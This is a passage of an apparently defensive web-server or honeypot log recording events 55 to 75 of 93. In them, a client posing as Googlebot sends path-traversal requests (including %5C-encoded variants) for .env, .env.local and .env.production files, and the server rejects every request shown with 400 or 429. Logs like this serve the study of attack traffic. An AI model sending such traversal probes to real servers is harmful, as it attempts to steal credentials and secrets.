+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     46 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #55 of 93
+========================================================================
+  Request ID:     1781471891295715788-3840
+  Timestamp:      2026-06-14T21:18:11.29571631Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     46 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #56 of 93
+========================================================================
+  Request ID:     1781471891295809779-3841
+  Timestamp:      2026-06-14T21:18:11.295810542Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     46 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #57 of 93
+========================================================================
+  Request ID:     1781471891295970880-3843
+  Timestamp:      2026-06-14T21:18:11.295971513Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     46 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #58 of 93
+========================================================================
+  Request ID:     1781471891295996756-3844
+  Timestamp:      2026-06-14T21:18:11.29599745Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     44 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #59 of 93
+========================================================================
+  Request ID:     1781471891296417647-3849
+  Timestamp:      2026-06-14T21:18:11.29641813Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     45 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:11 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #60 of 93
+========================================================================
+  Request ID:     1781471901314621279-4774
+  Timestamp:      2026-06-14T21:18:21.314622Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     27 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:21 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #61 of 93
+========================================================================
+  Request ID:     1781471901746267944-4968
+  Timestamp:      2026-06-14T21:18:21.746268415Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     90 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Sun, 14 Jun 2026 21:18:21 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #62 of 93
+========================================================================
+  Request ID:     1781482763383432391-5993
+  Timestamp:      2026-06-15T00:19:23.383433029Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../../.env
+  Path:           /../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     5 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #63 of 93
+========================================================================
+  Request ID:     1781482763384909681-6004
+  Timestamp:      2026-06-15T00:19:23.38491073Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env
+  Path:           /../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     51 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #64 of 93
+========================================================================
+  Request ID:     1781482763388924403-6008
+  Timestamp:      2026-06-15T00:19:23.38892532Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     4 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #65 of 93
+========================================================================
+  Request ID:     1781482763388931398-6009
+  Timestamp:      2026-06-15T00:19:23.38893208Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     47 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #66 of 93
+========================================================================
+  Request ID:     1781482763389828874-6010
+  Timestamp:      2026-06-15T00:19:23.389829947Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../.env.local
+  Path:           /../../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     51 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #67 of 93
+========================================================================
+  Request ID:     1781482763396013279-6014
+  Timestamp:      2026-06-15T00:19:23.396014026Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C.env
+  Path:           /..\.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     45 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #68 of 93
+========================================================================
+  Request ID:     1781482763847729368-6249
+  Timestamp:      2026-06-15T00:19:23.84773Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     91 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #69 of 93
+========================================================================
+  Request ID:     1781482763847759128-6250
+  Timestamp:      2026-06-15T00:19:23.847759548Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     91 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:23 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #70 of 93
+========================================================================
+  Request ID:     1781482772696836373-6934
+  Timestamp:      2026-06-15T00:19:32.69683694Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C..%5Cenv
+  Path:           /..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     42 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:32 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #71 of 93
+========================================================================
+  Request ID:     1781482772697188472-6935
+  Timestamp:      2026-06-15T00:19:32.697189257Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.107
+  URL:            /..%5C..%5C..%5Cenv
+  Path:           /..\..\..\env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       429 429 Too Many Requests
+    Duration:     142 ms
+    Headers:
+      Connection: keep-alive
+      Content-Length: 169
+      Content-Type: text/html
+      Date: Mon, 15 Jun 2026 00:19:32 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (169 chars):
+    <html>
+    <head><title>429 Too Many Requests</title></head>
+    <body>
+    <center><h1>429 Too Many Requests</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #72 of 93
+========================================================================
+  Request ID:     1781596653349763152-11229
+  Timestamp:      2026-06-16T07:57:33.349763636Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../.env.production
+  Path:           /../.env.production
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     7 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #73 of 93
+========================================================================
+  Request ID:     1781596653349763392-11230
+  Timestamp:      2026-06-16T07:57:33.349764334Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../.env.local
+  Path:           /../.env.local
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     9 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #74 of 93
+========================================================================
+  Request ID:     1781596653349810138-11231
+  Timestamp:      2026-06-16T07:57:33.349810766Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../../../../.env
+  Path:           /../../../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  TLS version:    TLS 1.3
+  Cipher suite:   TLS_AES_128_GCM_SHA256
+  Response:
+    Status:       400 400 Bad Request
+    Duration:     7 ms
+    Headers:
+      Content-Length: 157
+      Content-Type: text/html
+      Date: Tue, 16 Jun 2026 07:57:33 GMT
+      Permissions-Policy: geolocation=(), microphone=()
+      Referrer-Policy: strict-origin-when-cross-origin
+      Server: nginx/1.31.1
+      X-Content-Type-Options: nosniff
+      X-Frame-Options: SAMEORIGIN
+      X-Xss-Protection: 1; mode=block
+    Body (157 chars):
+    <html>
+    <head><title>400 Bad Request</title></head>
+    <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr><center>nginx/1.31.1</center>
+    </body>
+    </html>
+
+========================================================================
+EVENT #75 of 93
+========================================================================
+  Request ID:     1781596653349917038-11236
+  Timestamp:      2026-06-16T07:57:33.349917386Z
+  Client IP:      151.243.150.23
+  Method:         GET
+  Host:           145.220.231.104
+  URL:            /../../.env
+  Path:           /../../.env
+  User-Agent:     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+  Forwarded to:   https://localhost:8082
+  Experiment:     hardened
+  Likely CVE:     TECH-ENV-EXPOSURE — Exposed environment file (.env) (Application configuration, confirmed)
+  Request headers:
+    Accept: */*
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
